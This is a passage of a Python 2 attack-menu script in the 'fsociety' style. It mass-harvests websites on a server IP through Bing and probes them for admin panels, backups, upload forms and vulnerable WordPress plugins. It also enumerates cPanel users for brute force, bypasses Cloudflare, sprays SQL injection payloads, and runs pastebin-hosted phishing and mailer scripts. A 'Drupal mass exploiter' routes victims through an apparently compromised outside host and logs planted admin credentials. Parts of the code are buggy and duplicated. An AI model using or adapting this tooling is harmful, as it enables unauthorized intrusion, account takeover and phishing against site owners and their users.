    print('''sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping
    attacks.
    It requires Python 2.5 or newer, along with the 'twisted' python module.''')
    if yesOrNo():
        os.system("git clone --depth=1 https://github.com/moxie0/sslstrip.git")
        os.system("apt-get install python-twisted-web")
        os.system("python sslstrip/setup.py")
    else:
        sniffingSpoofingMenu.completed("SSlStrip")


def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]


def bing_all_grabber(s):

    lista = []
    page = 1
    while page <= 101:
        try:
            bing = "http://www.bing.com/search?q=ip%3A" + \
                s + "+&count=50&first=" + str(page)
            openbing = urllib2.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                allnoclean = findwebs[i]
                findall1 = re.findall('http://(.*?)/', allnoclean)
                for idx, item in enumerate(findall1):
                    if 'www' not in item:
                        findall1[idx] = 'http://www.' + item + '/'
                    else:
                        findall1[idx] = 'http://' + item + '/'
                lista.extend(findall1)

            page += 50
        except urllib2.URLError:
            pass

    final = unique(lista)
    return final


def check_gravityforms(sites):
    import urllib
    gravityforms = []
    for site in sites:
        try:
            if urllib.urlopen(site + 'wp-content/plugins/gravityforms/gravityforms.php').getcode() == 403:
                gravityforms.append(site)
        except:
            pass

    return gravityforms


def gravity():
    ip = raw_input('Enter IP: ')
    sites = bing_all_grabber(str(ip))
    gravityforms = check_gravityforms(sites)
    for ss in gravityforms:
        print ss

    print('\n')
    print('[*] Found, ', len(gravityforms), ' gravityforms.')


def shellnoob():
    print('''Writing shellcodes has always been super fun, but some parts are extremely boring and error prone. Focus only on the fun part, and use ShellNoob!''')
    if yesOrNo():
        os.system("git clone --depth=1 https://github.com/reyammer/shellnoob.git")
        os.system("mv shellnoob/shellnoob.py shellnoob.py")
        os.system("python shellnoob.py --install")
    else:
        exploitationToolsMenu()


def androidhash():
    key = raw_input("Enter the android hash: ")
    salt = raw_input("Enter the android salt: ")
    os.system(
        "git clone --depth=1 https://github.com/PentesterES/AndroidPINCrack.git")
    os.system(
        "cd AndroidPINCrack && python AndroidPINCrack.py -H %s -s %s" % (key, salt))


def cmsfew():
    print("your target must be Joomla, Mambo, PHP-Nuke, and XOOPS Only ")
    target = raw_input("Select a target: ")
    os.system(
        "wget https://dl.packetstormsecurity.net/UNIX/scanners/cms_few.py.txt -O cms.py")
    os.system("python cms.py %s" % target)


def smtpsend():
    os.system("wget http://pastebin.com/raw/Nz1GzWDS --output-document=smtp.py")
    clearScr()
    os.system("python smtp.py")


def pisher():
    os.system("wget http://pastebin.com/raw/DDVqWp4Z --output-document=pisher.py")
    clearScr()
    os.system("python pisher.py")


menuu = fsocietylogo + '''

   {1}--Get all websites
   {2}--Get joomla websites
   {3}--Get wordpress websites
   {4}--Control Panel Finder
   {5}--Zip Files Finder
   {6}--Upload File Finder
   {7}--Get server users
   {8}--SQli Scanner
   {9}--Ports Scan (range of ports)
   {10}-ports Scan (common ports)
   {11}-Get server Info
   {12}-Bypass Cloudflare

   {99}-Back To Main Menu
'''


def unique(seq):
    '''
    get unique from list found it on stackoverflow
    '''
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]


class Fscan:
    def __init__(self, serverip):
        self.serverip = serverip
        self.getSites(False)
        print menuu
        while True:
            choice = raw_input(fsocietyPrompt)
            if choice == '1':
                self.getSites(True)
            elif choice == '2':
                self.getJoomla()
            elif choice == '3':
                self.getWordpress()
            elif choice == '4':
                self.findPanels()
            elif choice == '5':
                self.findZip()
            elif choice == '6':
                self.findUp()
            elif choice == '7':
                self.getUsers()
            elif choice == '8':
                self.grabSqli()
            elif choice == '9':
                ran = raw_input(' Enter range of ports, (ex: 1-1000) -> ')
                self.portScanner(1, ran)
            elif choice == '10':
                self.portScanner(2, None)
            elif choice == '11':
                self.getServerBanner()
            elif choice == '12':
                self.cloudflareBypasser()
            elif choice == '99':
                fsociety()
            con = raw_input(' Continue [Y/n] -> ')
            if con[0].upper() == 'N':
                exit()
            else:
                clearScr()
                print menuu

    def getSites(self, a):
        '''
        get all websites on same server
        from bing search
        '''
        lista = []
        page = 1
        while page <= 101:
            try:
                bing = "http://www.bing.com/search?q=ip%3A" + \
                    self.serverip + "+&count=50&first=" + str(page)
                openbing = urllib2.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"', readbing)
                for i in range(len(findwebs)):
                    allnoclean = findwebs[i]
                    findall1 = re.findall('http://(.*?)/', allnoclean)
                    for idx, item in enumerate(findall1):
                        if 'www' not in item:
                            findall1[idx] = 'http://www.' + item + '/'
                        else:
                            findall1[idx] = 'http://' + item + '/'
                    lista.extend(findall1)

                page += 50
            except urllib2.URLError:
                pass
        self.sites = unique(lista)
        if a:
            clearScr()
            print('[*] Found ', len(lista), ' Website\n')
            for site in self.sites:
                print site

    def getWordpress(self):
        '''
        get wordpress site using a dork the attacker
        may do a password list attack (i did a tool for that purpose check my pastebin)
        or scan for common vulnerabilities using wpscan for example (i did a simple tool
        for multi scanning using wpscan)
        '''
        lista = []
        page = 1
        while page <= 101:
            try:
                bing = "http://www.bing.com/search?q=ip%3A" + \
                    self.serverip + "+?page_id=&count=50&first=" + str(page)
                openbing = urllib2.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"', readbing)
                for i in range(len(findwebs)):
                    wpnoclean = findwebs[i]
                    findwp = re.findall('(.*?)\?page_id=', wpnoclean)
                    lista.extend(findwp)
                page += 50
            except:
                pass
        lista = unique(lista)
        clearScr()
        print('[*] Found ', len(lista), ' Wordpress Website\n')
        for site in lista:
            print site

    def getJoomla(self):
        '''
        get all joomla websites using
        bing search the attacker may bruteforce
        or scan them
        '''
        lista = []
        page = 1
        while page <= 101:
            bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + \
                "+index.php?option=com&count=50&first=" + str(page)
            openbing = urllib2.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                jmnoclean = findwebs[i]
                findjm = re.findall('(.*?)index.php', jmnoclean)
                lista.extend(findjm)
            page += 50
        lista = unique(lista)
        clearScr()
        print('[*] Found ' + len(lista) + ' Joomla Website\n')
        for site in lista:
            print site
############################
# find admin panels

    def findPanels(self):
        '''
        find panels from grabbed websites
        the attacker may do a lot of vulnerabilty
        tests on the admin area
        '''
        print "[~] Finding admin panels"
        adminList = ['admin/', 'site/admin', 'admin.php/', 'up/admin/', 'central/admin/', 'whm/admin/', 'whmcs/admin/', 'support/admin/', 'upload/admin/', 'video/admin/', 'shop/admin/', 'shoping/admin/', 'wp-admin/', 'wp/wp-admin/', 'blog/wp-admin/', 'admincp/', 'admincp.php/', 'vb/admincp/', 'forum/admincp/', 'up/admincp/', 'administrator/',
                     'administrator.php/', 'joomla/administrator/', 'jm/administrator/', 'site/administrator/', 'install/', 'vb/install/', 'dimcp/', 'clientes/', 'admin_cp/', 'login/', 'login.php', 'site/login', 'site/login.php', 'up/login/', 'up/login.php', 'cp.php', 'up/cp', 'cp', 'master', 'adm', 'member', 'control', 'webmaster', 'myadmin', 'admin_cp', 'admin_site']
        clearScr()
        for site in self.sites:
            for admin in adminList:
                try:
                    if urllib.urlopen(site + admin).getcode() == 200:
                        print " [*] Found admin panel -> ", site + admin
                except IOError:
                    pass
 ############################
 # find ZIP files

    def findZip(self):
        '''
        find zip files from grabbed websites
        it may contain useful informations
        '''
        zipList = ['backup.tar.gz', 'backup/backup.tar.gz', 'backup/backup.zip', 'vb/backup.zip', 'site/backup.zip', 'backup.zip', 'backup.rar', 'backup.sql', 'vb/vb.zip', 'vb.zip', 'vb.sql', 'vb.rar',
                   'vb1.zip', 'vb2.zip', 'vbb.zip', 'vb3.zip', 'upload.zip', 'up/upload.zip', 'joomla.zip', 'joomla.rar', 'joomla.sql', 'wordpress.zip', 'wp/wordpress.zip', 'blog/wordpress.zip', 'wordpress.rar']
        clearScr()
        print "[~] Finding zip file"
        for site in self.sites:
            for zip1 in zipList:
                try:
                    if urllib.urlopen(site + zip1).getcode() == 200:
                        print " [*] Found zip file -> ", site + zip1
                except IOError:
                    pass

    def findUp(self):
        '''
        find upload forms from grabbed
        websites the attacker may succeed to
        upload malicious files like webshells
        '''
        upList = ['up.php', 'up1.php', 'up/up.php', 'site/up.php', 'vb/up.php', 'forum/up.php', 'blog/up.php', 'upload.php',
                  'upload1.php', 'upload2.php', 'vb/upload.php', 'forum/upload.php', 'blog/upload.php', 'site/upload.php', 'download.php']
        clearScr()
        print "[~] Finding Upload"
        for site in self.sites:
            for up in upList:
                try:
                    if (urllib.urlopen(site + up).getcode() == 200):
                        html = urllib.urlopen(site + up).readlines()
                        for line in html:
                            if re.findall('type=file', line):
                                print " [*] Found upload -> ", site + up
                except IOError:
                    pass

    def getUsers(self):
        '''
        get server users using a method found by
        iranian hackers , the attacker may
        do a bruteforce attack on CPanel, ssh, ftp or
        even mysql if it supports remote login
        (you can use medusa or hydra)
        '''
        clearScr()
        print "[~] Grabbing Users"
        userslist = []
        for site1 in self.sites:
            try:
                site = site1
                site = site.replace('http://www.', '')
                site = site.replace('http://', '')
                site = site.replace('.', '')
                if '-' in site:
                    site = site.replace('-', '')
                site = site.replace('/', '')
                while len(site) > 2:
                    resp = urllib2.urlopen(
                        site1 + '/cgi-sys/guestbook.cgi?user=%s' % site).read()
                    if 'invalid username' not in resp.lower():
                        print '\t [*] Found -> ', site
                        userslist.append(site)
                        break
                    else:
                        print site

                    site = site[:-1]
            except:
                pass

        clearScr()
        for user in userslist:
            print user

    def cloudflareBypasser(self):
        '''
        trys to bypass cloudflare i already wrote
        in my blog how it works, i learned this
        method from a guy in madleets
        '''
        clearScr()
        print "[~] Bypassing cloudflare"
        subdoms = ['mail', 'webmail', 'ftp', 'direct', 'cpanel']
        for site in self.sites:
            site.replace('http://', '')
            site.replace('/', '')
            try:
                ip = socket.gethostbyname(site)
            except socket.error:
                pass
            for sub in subdoms:
                doo = sub + '.' + site
                print ' [~] Trying -> ', doo
                try:
                    ddd = socket.gethostbyname(doo)
                    if ddd != ip:
                        print ' [*] Cloudflare bypassed -> ', ddd
                        break
                except socket.error:
                    pass

    def getServerBanner(self):
        '''
        simply gets the server banner
        the attacker may benefit from it
        like getting the server side software
        '''
        clearScr()
        try:
            s = 'http://' + self.serverip
            httpresponse = urllib.urlopen(s)
            print ' [*] Server header -> ', httpresponse.headers.getheader(
                'server')
        except:
            print('[*] Server header ->  Not Found')

    def grabSqli(self):
        '''
        just grabs all websites in server with php?id= dork
        for scanning for error based sql injection
        '''
        page = 1
        lista = []
        while page <= 101:
            try:
                bing = "http://www.bing.com/search?q=ip%3A" + \
                    self.serverip + "+php?id=&count=50&first=" + str(page)
                openbing = urllib2.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"', readbing)
                for i in range(len(findwebs)):
                    x = findwebs[i]
                    lista.append(x)
            except:
                pass
            page += 50
        lista = unique(lista)
        self.checkSqli(lista)

    def checkSqli(self, s):
        '''
        checks for error based sql injection,
        most of the codes here are from webpwn3r
        project the one who has found an lfi in
        yahoo as i remember, you can find a separate
        tool in my blog
        '''
        clearScr()
        print "[~] Checking SQL injection"
        payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><",
                    "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
        check = re.compile(
            "Incorrect syntax|mysql_fetch|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
        for url in s:
            try:
                for param in url.split('?')[1].split('&'):
                    for payload in payloads:
                        power = url.replace(param, param + payload.strip())

                        html = urllib2.urlopen(power).readlines()
                        for line in html:
                            checker = re.findall(check, line)
                            if len(checker) != 0:
                                print ' [*] SQLi found -> ', power
            except:
                pass


    def portScanner(self, mode, ran):
        '''
        simple port scanner works with range of ports
        or with common ports (al-swisre idea)
        '''
        clearScr()
        print "[~] Scanning Ports"

        if mode == 1:
            a = ran.split('-')
            start = int(a[0])
            end = int(a[1])
            for i in range(start, end):
                do_it(self.serverip, i)
        elif mode == 2:
            for port in [80, 21, 22, 2082, 25, 53, 110, 443, 143]:
                do_it(self.serverip, port)


def do_it(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    sock = sock.connect_ex((ip, port))
    if sock == 0:
        print " [*] Port %i is open" % port


############################
minu = '''
\t 1: Drupal Bing Exploiter
\t 2: Get Drupal Websites
\t 3: Drupal Mass Exploiter
\t 99: Back To Main Menu
'''


def drupal():
    '''Drupal Exploit Binger All Websites Of server '''
    ip = raw_input('1- IP: ')
    page = 1
    while page <= 50:

        url = "http://www.bing.com/search?q=ip%3A" + ip + "&go=Valider&qs=n&form=QBRE&pq=ip%3A" + \
            ip + "&sc=0-0&sp=-1&sk=&cvid=af529d7028ad43a69edc90dbecdeac4f&first=" + \
            str(page)
        req = urllib2.Request(url)
        opreq = urllib2.urlopen(req).read()
        findurl = re.findall(
            '<div class="b_title"><h2><a href="(.*?)" h=', opreq)
        page += 1

        for url in findurl:
            try:

                urlpa = urlparse(url)
                site = urlpa.netloc

                print "[+] Testing At " + site
                resp = urllib2.urlopen(
                    'http://crig-alda.ro/wp-admin/css/index2.php?url=' + site + '&submit=submit')
                read = resp.read()
                if "User: HolaKo" in read:
                    print "Exploit found =>" + site

                    print "user:HolaKo\npass:admin"
                    a = open('up.txt', 'a')
                    a.write(site + '\n')
                    a.write("user:" + user + "\npass:" + pwd + "\n")
                else:
                    print "[-] Expl Not Found:( "

            except Exception as ex:
                print ex
                sys.exit(0)

        # Drupal Server ExtraCtor


def getdrupal():
    ip = raw_input('Enter The Ip:  ')
    page = 1
    sites = list()
    while page <= 50:

        url = "http://www.bing.com/search?q=ip%3A" + ip + \
            "+node&go=Valider&qs=ds&form=QBRE&first=" + str(page)
        req = urllib2.Request(url)
        opreq = urllib2.urlopen(req).read()
        findurl = re.findall(
            '<div class="b_title"><h2><a href="(.*?)" h=', opreq)
        page += 1

        for url in findurl:
            split = urlparse(url)
            site = split.netloc
            if site not in sites:
                print site
                sites.append(site)

        # Drupal Mass List Exploiter


def drupallist():
    listop = raw_input("Enter The list Txt: ")
    fileopen = open(listop, 'r')
    content = fileopen.readlines()
    for i in content:
        url = i.strip()
        try:
            openurl = urllib2.urlopen(
                'http://crig-alda.ro/wp-admin/css/index2.php?url=' + url + '&submit=submit')
            readcontent = openurl.read()
            if "Success" in readcontent:
                print "[+]Success =>" + url
                print "[-]username:HolaKo\n[-]password:admin"
                save = open('drupal.txt', 'a')
                save.write(
                    url + "\n" + "[-]username:HolaKo\n[-]password:admin\n")

            else:
                print i + "=> exploit not found "
        except Exception as ex:
            print ex


def maine():

    print minu
    choose = raw_input("choose a number: ")
    while True:

        if choose == "1":
            drupal()
        elif choose == "2":
            getdrupal()
        elif choose == "3":
            drupallist()
        elif choose == "4":
            about()
        elif choose == "99":
            fsociety()
        else:
            maine()


def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]


def bing_all_grabber(s):
    lista = []
    page = 1
    while page <= 101:
        try:
            bing = "http://www.bing.com/search?q=ip%3A" + \
                s + "+&count=50&first=" + str(page)
            openbing = urllib2.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                allnoclean = findwebs[i]
                findall1 = re.findall('http://(.*?)/', allnoclean)
                for idx, item in enumerate(findall1):
                    if 'www' not in item:
                        findall1[idx] = 'http://www.' + item + '/'
                    else:
                        findall1[idx] = 'http://' + item + '/'
                lista.extend(findall1)

            page += 50
        except urllib2.URLError:
            pass

    final = unique(lista)
    return final


def check_wordpress(sites):
    wp = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'wp-login.php').getcode() == 200:
                wp.append(site)
        except:
            pass

    return wp


def check_joomla(sites):
    joomla = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'administrator').getcode() == 200:
                joomla.append(site)
        except:
            pass

    return joomla


def wppjmla():

    ipp = raw_input('Enter Target IP: ')
    sites = bing_all_grabber(str(ipp))
    wordpress = check_wordpress(sites)
    joomla = check_joomla(sites)
    for ss in wordpress:
        print ss
    print '[+] Found ! ', len(wordpress), ' Wordpress Websites'
    print '-' * 30 + '\n'
    for ss in joomla:
        print ss

    print '[+] Found ! ', len(joomla), ' Joomla Websites'

    print '\n'
# initialise the fscan function

############################


def grabsqli(ip):
    try:
        print color.OKBLUE + "Check_Uplaod... "
        print '\n'

        page = 1
        while page <= 21:
            bing = "http://www.bing.com/search?q=ip%3A" + \
                ip + "+upload&count=50&first=" + str(page)
            openbing = urllib2.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            sites = findwebs
            for i in sites:
                try:
                    response = urllib2.urlopen(i).read()
                    checksqli(i)
                except urllib2.HTTPError, e:
                    str(sites).strip(i)

            page = page + 10
    except:
        pass


def checksqli(sqli):
    responsetwo = urllib2.urlopen(sqli).read()
    find = re.findall('type="file"', responsetwo)
    if find:
        print(" Found ==> " + sqli)


def sqlscan():
    ip = raw_input('Enter IP -> ')
    grabsqli(ip)


def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]


def bing_all_grabber(s):
    lista = []
    page = 1
    while page <= 101:
        try:
            bing = "http://www.bing.com/search?q=ip%3A" + \
                s + "+&count=50&first=" + str(page)
            openbing = urllib2.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                allnoclean = findwebs[i]
                findall1 = re.findall('http://(.*?)/', allnoclean)
                for idx, item in enumerate(findall1):
                    if 'www' not in item:
                        findall1[idx] = 'http://www.' + item + '/'
                    else:
                        findall1[idx] = 'http://' + item + '/'
                lista.extend(findall1)

            page += 50
        except urllib2.URLError:
            pass

    final = unique(lista)
    return final


def check_wordpress(sites):
    wp = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'wp-login.php').getcode() == 200:
                wp.append(site)
        except:
            pass

    return wp


def check_wpstorethemeremotefileupload(sites):
    wpstorethemeremotefileupload = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'wp-content/themes/WPStore/upload/index.php').getcode() == 200:
                wpstorethemeremotefileupload.append(site)
        except:
            pass

    return wpstorethemeremotefileupload


def check_wpcontactcreativeform(sites):
    wpcontactcreativeform = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'wp-content/plugins/sexy-contact-form/includes/fileupload/index.php').getcode() == 200:
                wpcontactcreativeform.append(site)
        except:
            pass

    return wpcontactcreativeform


def check_wplazyseoplugin(sites):
    wplazyseoplugin = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'wp-content/plugins/lazy-seo/lazyseo.php').getcode() == 200:
                wplazyseoplugin.append(site)
        except:
            pass

    return wplazyseoplugin


def check_wpeasyupload(sites):
    wpeasyupload = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'wp-content/plugins/easy-comment-uploads/upload-form.php').getcode() == 200:
                wpeasyupload.append(site)
        except:
            pass

    return wpeasyupload


def check_wpsymposium(sites):
    wpsymposium = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'wp-symposium/server/file_upload_form.php').getcode() == 200:
                wpsycmium.append(site)
        except:
            pass

    return wpsymposium


def wpminiscanner():
    ip = raw_input('Enter IP: ')
    sites = bing_all_grabber(str(ip))
    wordpress = check_wordpress(sites)
    wpstorethemeremotefileupload = check_wpstorethemeremotefileupload(sites)
    wpcontactcreativeform = check_wpcontactcreativeform(sites)
    wplazyseoplugin = check_wplazyseoplugin(sites)
    wpeasyupload = check_wpeasyupload(sites)
    wpsymposium = check_wpsymposium(sites)
    for ss in wordpress:
        print ss
    print '[*] Found, ', len(wordpress), ' wordpress sites.'
    print '-' * 30 + '\n'
    for ss in wpstorethemeremotefileupload:
        print ss
    print '[*] Found, ', len(
        wpstorethemeremotefileupload), ' wp_storethemeremotefileupload exploit.'
    print '-' * 30 + '\n'
    for ss in wpcontactcreativeform:
        print ss
    print '[*] Found, ', len(wpcontactcreativeform), ' wp_contactcreativeform exploit.'
    print '-' * 30 + '\n'
    for ss in wplazyseoplugin:
        print ss
    print '[*] Found, ', len(wplazyseoplugin), ' wp_lazyseoplugin exploit.'
    print '-' * 30 + '\n'
    for ss in wpeasyupload:
        print ss
    print '[*] Found, ', len(wpeasyupload), ' wp_easyupload exploit.'
    print '-' * 30 + '\n'
    for ss in wpsymposium:
        print ss

    print '[*] Found, ', len(wpsymposium), ' wp_sympsiup exploit.'

    print '\n'
############################


if __name__ == "__main__":
    try:
        agreement()
        fsociety()
    except KeyboardInterrupt:
        print(" Finishing up...\n")
        time.sleep(0.25)
